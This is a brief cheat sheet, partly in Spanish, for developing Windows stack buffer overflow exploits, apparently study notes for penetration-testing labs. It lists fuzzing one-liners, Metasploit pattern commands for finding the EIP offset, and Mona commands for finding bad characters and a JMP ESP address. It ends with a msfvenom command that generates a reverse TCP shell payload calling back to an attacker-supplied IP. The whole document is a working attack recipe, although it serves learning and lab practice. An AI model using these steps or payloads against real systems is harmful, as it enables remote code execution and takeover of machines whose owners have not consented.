# Pattern

```
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
python -c "print('A'*10000)"

/usr/bin/msf-pattern_create -l 200
/usr/bin/msf-pattern_offset -l 200 -q <EIP>
```

# Mona

```
# Configuración del directorio
!mona config -set workingfolder c:\mona\%p

# Comparar distancia
!mona findmsp -distance 600

# Encontrar malos personajes
!mona bytearray -b "\x00"

# Comparar carácteres
!mona compare -f C:\mona\bytearray.bin -a <ESP address>

# Encontrar jmp esp
!mona jmp -r esp -cpb "\x00" # El resultado va a en retn pero al revés (Little Endian)
```

Generar cadena de carácteres incorrectos con Python:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

## Generar carga útil

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c 
```